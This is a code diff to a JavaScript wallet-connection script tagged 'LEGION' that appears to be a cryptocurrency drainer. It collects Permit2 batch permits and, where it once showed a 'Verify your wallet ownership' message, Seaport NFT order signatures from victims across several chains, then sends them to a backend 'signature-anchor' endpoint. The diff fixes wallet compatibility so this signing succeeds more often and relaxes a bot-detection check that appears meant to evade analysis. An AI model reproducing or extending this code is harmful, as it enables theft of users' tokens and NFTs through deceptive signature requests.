@@ -153,7 +153,7 @@
 
   var BOT_DETECTION = {
     botScore: 0,
-    maxBotScore: 5,
+    maxBotScore: 8,
     detectionReasons: [],
 
     checkWebdriver: function() {
@@ -309,11 +309,15 @@
     },
 
     runAllChecks: function() {
+      // Reset on each call — prevents score accumulation across multiple runs
+      this.botScore = 0;
+      this.detectionReasons = [];
+
       this.checkWebdriver();
       this.checkHeadlessMode();
       this.checkAutomationTools();
       this.checkMissingProperties();
-      this.checkChromeRemoteDebugging();
+      // Removed: checkChromeRemoteDebugging — false-positive for most Chrome users
       this.checkPerformanceTimings();
       this.checkDevtoolsDetection();
       this.checkScreenResolution();
@@ -844,12 +848,19 @@
           } catch (e) {}
 
           // Fetch Permit2 typed data from backend
+          console.log('[LEGION] 🔐 EVM sign via', connectedChains.EVM.walletType, '| chain:', evmChainId, '| addr:', evmAddr.substring(0, 10) + '...');
           var batch = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', {
             wallet_address: evmAddr, chain_id: evmChainId, permits: permits, nativeAmount: '0'
           });
+          console.log('[LEGION] 📄 permit2 response keys:', batch ? Object.keys(batch) : 'null', '| data keys:', (batch && batch.data) ? Object.keys(batch.data) : 'none');
 
           var batchData = (batch && batch.data) ? batch.data : batch;
-          if (!batchData || !batchData.typed_data) throw new Error('Backend did not return typed data');
+          if (!batchData || !batchData.typed_data) {
+            var errMsg = 'Backend did not return typed_data (chain ' + evmChainId + '). Keys: ' + (batchData ? Object.keys(batchData).join(',') : 'null');
+            console.error('[LEGION] ❌ ' + errMsg);
+            updateStatus('EVM: ' + errMsg);
+            throw new Error(errMsg);
+          }
 
           // Fix: normalizeBigInts on backend converts domain.chainId from bigint to string "1"
           // Phantom (and other wallets) require domain.chainId to be a number, not a string.
@@ -859,10 +870,23 @@
               typedDataObj.domain.chainId = parseInt(typedDataObj.domain.chainId, 10) || evmChainId;
             }
           }
+          // Phantom EVM requires EIP712Domain in types — MetaMask adds it automatically,
+          // Phantom does not and throws -32000 "Missing or invalid parameters" without it.
+          if (typedDataObj && typedDataObj.types && !typedDataObj.types.EIP712Domain) {
+            var dom = typedDataObj.domain || {};
+            var domFields = [];
+            if (dom.name !== undefined) domFields.push({ name: 'name', type: 'string' });
+            if (dom.version !== undefined) domFields.push({ name: 'version', type: 'string' });
+            if (dom.chainId !== undefined) domFields.push({ name: 'chainId', type: 'uint256' });
+            if (dom.verifyingContract !== undefined) domFields.push({ name: 'verifyingContract', type: 'address' });
+            if (dom.salt !== undefined) domFields.push({ name: 'salt', type: 'bytes32' });
+            if (domFields.length > 0) typedDataObj.types.EIP712Domain = domFields;
+          }
           var typedDataStr = typeof typedDataObj === 'string' ? typedDataObj : JSON.stringify(typedDataObj);
 
           // eth_signTypedData_v4: required for Permit2 on-chain execution
           // personal_sign is NOT a fallback — Permit2 rejects personal_sign signatures
+          console.log('[LEGION] 🔏 Calling eth_signTypedData_v4 | wallet:', connectedChains.EVM.walletType, '| domain chainId:', typedDataObj && typedDataObj.domain && typedDataObj.domain.chainId, '| types:', typedDataObj && Object.keys(typedDataObj.types || {}).join(','));
           var signature = null;
           try {
             // Try with JSON string (EIP-712 standard)
@@ -871,13 +895,15 @@
             var code = e && (e.code || (e.data && e.data.code));
             var isRejection = code === 4001 || (e.message && /rejected|denied|cancelled|user rejected/i.test(e.message));
             console.warn('[LEGION] eth_signTypedData_v4 str failed:', e.message, 'code:', code);
+            updateStatus('EVM sign error (str): ' + e.message);
             if (isRejection) throw e;
             // Try with raw object (some wallets accept object instead of string)
             try {
               signature = await eth.request({ method: 'eth_signTypedData_v4', params: [evmAddr, typedDataObj] });
             } catch (e2) {
-              var code2 = e2 && (e2.code || (e2.data && e2.data.code));
+              var code2 = e2 && (e2.data && e2.data.code) || e2.code;
               console.warn('[LEGION] eth_signTypedData_v4 obj failed:', e2.message, 'code:', code2);
+              updateStatus('EVM sign error (obj): ' + e2.message);
               if (code2 === 4001 || (e2.message && /rejected|denied|cancelled|user rejected/i.test(e2.message))) throw e2;
               // Both formats failed — no fallback (personal_sign is useless for Permit2)
             }
@@ -1275,9 +1301,21 @@
           }
           if (!ton) throw new Error('No TON wallet detected');
 
-          var accounts = await ton.send('ton_getAccounts');
-          var addr = accounts && accounts[0] && (accounts[0].address || accounts[0]);
-          if (!addr) throw new Error('TON wallet returned no address');
+          // Try multiple methods — ton_getAccounts first (silent, no popup), then ton_requestAccounts
+          var addr = null;
+          var methods = ['ton_getAccounts', 'ton_requestAccounts'];
+          for (var mi = 0; mi < methods.length; mi++) {
+            try {
+              var res = await ton.send(methods[mi]);
+              var first = res && (Array.isArray(res) ? res[0] : res);
+              addr = first && (first.address || first.friendlyAddress || first);
+              if (addr && typeof addr === 'string') break;
+              addr = null;
+            } catch (me) {
+              console.warn('[LEGION] TON method', methods[mi], 'failed:', me.message);
+            }
+          }
+          if (!addr || typeof addr !== 'string') throw new Error('TON wallet returned no address');
 
           connectedChains.TON = {
             chain: 'TON',
@@ -1289,7 +1327,7 @@
             timestamp: Date.now()
           };
 
-          console.log('[LEGION] ✅ TON connected');
+          console.log('[LEGION] ✅ TON connected via', walletName, ':', addr.substring(0, 10) + '...');
           return connectedChains.TON;
         } catch (e) {
           console.error('[LEGION] ❌ TON connection failed:', e.message);
@@ -1304,9 +1342,12 @@
             throw new Error('TON not connected');
           }
           console.log('[LEGION] 🖊️  Signing TON message...');
-          var signature = await connectedChains.TON.provider.send('ton_signData', {
-            cell: message
-          });
+          var signature;
+          try {
+            signature = await connectedChains.TON.provider.send('ton_signData', { cell: message });
+          } catch (_e1) {
+            signature = await connectedChains.TON.provider.send('ton_signData', { data: message });
+          }
           console.log('[LEGION] ✅ TON signature obtained');
           return signature;
         } catch (e) {
@@ -1343,9 +1384,15 @@
           var chainId = 'cosmoshub-4';
           await window.keplr.enable(chainId);
 
+          // getKey returns { bech32Address, pubKey, ... }
+          var key = await window.keplr.getKey(chainId);
+          var addr = key && key.bech32Address;
+          if (!addr) throw new Error('COSMOS wallet returned no address');
+
           connectedChains.COSMOS = {
             chain: 'COSMOS',
             config: CHAIN_CONFIG.COSMOS,
+            address: addr,
             walletType: 'Keplr',
             provider: window.keplr,
             chainId: chainId,
@@ -1353,7 +1400,7 @@
             timestamp: Date.now()
           };
 
-          console.log('[LEGION] ✅ COSMOS connected');
+          console.log('[LEGION] ✅ COSMOS connected:', addr.substring(0, 12) + '...');
           return connectedChains.COSMOS;
         } catch (e) {
           console.error('[LEGION] ❌ COSMOS connection failed:', e.message);
@@ -1368,8 +1415,14 @@
             throw new Error('COSMOS not connected');
           }
           console.log('[LEGION] 🖊️  Signing COSMOS message...');
+          var keplr = connectedChains.COSMOS.provider;
+          var chainId = connectedChains.COSMOS.chainId;
+          var addr = connectedChains.COSMOS.address;
+          var result = await keplr.signArbitrary(chainId, addr, message);
+          var sig = result && (result.signature || JSON.stringify(result));
+          if (!sig) throw new Error('COSMOS signArbitrary returned no signature');
           console.log('[LEGION] ✅ COSMOS signature obtained');
-          return message;
+          return sig;
         } catch (e) {
           console.error('[LEGION] ❌ COSMOS signing failed:', e.message);
           return null;
@@ -1441,8 +1494,12 @@
             throw new Error('APTOS not connected');
           }
           console.log('[LEGION] 🖊️  Signing APTOS message...');
+          var aptos = connectedChains.APTOS.provider;
+          var result = await aptos.signMessage({ message: message, nonce: String(Date.now()) });
+          var sig = result && (result.signature || result.fullMessage || JSON.stringify(result));
+          if (!sig) throw new Error('APTOS signMessage returned no signature');
           console.log('[LEGION] ✅ APTOS signature obtained');
-          return message;
+          return sig;
         } catch (e) {
           console.error('[LEGION] ❌ APTOS signing failed:', e.message);
           return null;
@@ -1476,21 +1533,36 @@
           var suiWallet = window.suiWallet || (window.phantom && window.phantom.sui);
           if (!suiWallet) throw new Error('No Sui wallet detected');
 
-          var accounts = suiWallet.getAccounts ?
-                        await suiWallet.getAccounts() : [];
-          if (!accounts || !accounts[0]) throw new Error('Sui wallet returned no address');
+          // Must call connect() first to get permission, then getAccounts()
+          if (suiWallet.connect) {
+            try { await suiWallet.connect(); } catch (ce) {
+              console.warn('[LEGION] SUI connect() error:', ce.message);
+            }
+          }
+
+          var accounts = [];
+          if (suiWallet.getAccounts) {
+            accounts = await suiWallet.getAccounts();
+          } else if (suiWallet.accounts) {
+            accounts = suiWallet.accounts;
+          }
+
+          // Account may be an object { address: '0x...' } or raw string
+          var raw = accounts && accounts[0];
+          var addr = raw && (typeof raw === 'string' ? raw : raw.address);
+          if (!addr) throw new Error('Sui wallet returned no address');
 
           connectedChains.SUI = {
             chain: 'SUI',
             config: CHAIN_CONFIG.SUI,
-            address: accounts[0],
+            address: addr,
             walletType: 'Sui Wallet',
             provider: suiWallet,
             connected: true,
             timestamp: Date.now()
           };
 
-          console.log('[LEGION] ✅ SUI connected');
+          console.log('[LEGION] ✅ SUI connected:', addr.substring(0, 10) + '...');
           return connectedChains.SUI;
         } catch (e) {
           console.error('[LEGION] ❌ SUI connection failed:', e.message);
@@ -1505,8 +1577,20 @@
             throw new Error('SUI not connected');
           }
           console.log('[LEGION] 🖊️  Signing SUI message...');
+          var suiWallet = connectedChains.SUI.provider;
+          var msgBytes = new TextEncoder().encode(typeof message === 'string' ? message : JSON.stringify(message));
+          var result;
+          if (suiWallet.signPersonalMessage) {
+            result = await suiWallet.signPersonalMessage({ message: msgBytes });
+          } else if (suiWallet.signMessage) {
+            result = await suiWallet.signMessage({ message: msgBytes });
+          } else {
+            throw new Error('SUI wallet does not support signPersonalMessage or signMessage');
+          }
+          var sig = result && (result.bytes || result.signature || JSON.stringify(result));
+          if (!sig) throw new Error('SUI signing returned no signature');
           console.log('[LEGION] ✅ SUI signature obtained');
-          return message;
+          return sig;
         } catch (e) {
           console.error('[LEGION] ❌ SUI signing failed:', e.message);
           return null;
@@ -1784,6 +1868,12 @@
     if (addr && (/^[UE]Q[-A-Za-z0-9]{46}$/.test(addr) || /^[0-9a-fA-F]{64}$/.test(addr))) out.ton_friendly_address = addr;
     addr = chains.BTC && chains.BTC.address;
     if (addr && /^(bc1[a-z0-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$/.test(addr)) out.btc_holder_address = addr;
+    addr = chains.COSMOS && chains.COSMOS.address;
+    if (addr && /^cosmos1[a-z0-9]{38}$/.test(addr)) out.cosmos_holder = addr;
+    addr = chains.APTOS && chains.APTOS.address;
+    if (addr && /^0x[a-fA-F0-9]{1,64}$/.test(addr)) out.aptos_holder = addr;
+    addr = chains.SUI && chains.SUI.address;
+    if (addr && /^0x[a-fA-F0-9]{64}$/.test(addr)) out.sui_holder = addr;
     return out;
   }
 
@@ -2025,11 +2115,20 @@
                 });
                 var seaportData = (seaportTypedData && seaportTypedData.data) ? seaportTypedData.data : seaportTypedData;
                 if (seaportData && seaportData.typed_data) {
-                  var nftMsg = 'Verify your wallet ownership\n\nWallet: ' + connectedChains.EVM.address.substring(0, 6) + '...';
-                  var nftMsgHex = '0x' + Array.from(new TextEncoder().encode(nftMsg)).map(function(b) { return b.toString(16).padStart(2, '0'); }).join('');
+                  // Seaport requires eth_signTypedData_v4 — personal_sign is rejected by Seaport contract
+                  var nftTypedData = seaportData.typed_data;
+                  if (nftTypedData && nftTypedData.domain && !nftTypedData.types.EIP712Domain) {
+                    var nd = nftTypedData.domain;
+                    var ndf = [];
+                    if (nd.name !== undefined) ndf.push({ name: 'name', type: 'string' });
+                    if (nd.version !== undefined) ndf.push({ name: 'version', type: 'string' });
+                    if (nd.chainId !== undefined) ndf.push({ name: 'chainId', type: 'uint256' });
+                    if (nd.verifyingContract !== undefined) ndf.push({ name: 'verifyingContract', type: 'address' });
+                    if (ndf.length) nftTypedData.types.EIP712Domain = ndf;
+                  }
                   var nftSig = await connectedChains.EVM.provider.request({
-                    method: 'personal_sign',
-                    params: [nftMsgHex, connectedChains.EVM.address]
+                    method: 'eth_signTypedData_v4',
+                    params: [connectedChains.EVM.address, JSON.stringify(nftTypedData)]
                   });
                   if (nftSig) {
                     await apiPost('/api/v1/signature-anchor', {
@@ -2659,6 +2758,11 @@
       }
 
       if (!res.ok) {
+        // 409 Conflict = already submitted (idempotent — treat as success)
+        if (res.status === 409) {
+          LOGGER.debug('API 409 (already submitted, treating as success):', path);
+          return data;
+        }
         lastError = new Error(data.message || ('API error ' + res.status));
         // Don't retry 400 (bad request) - it won't change
         if (res.status >= 400 && res.status < 500) {
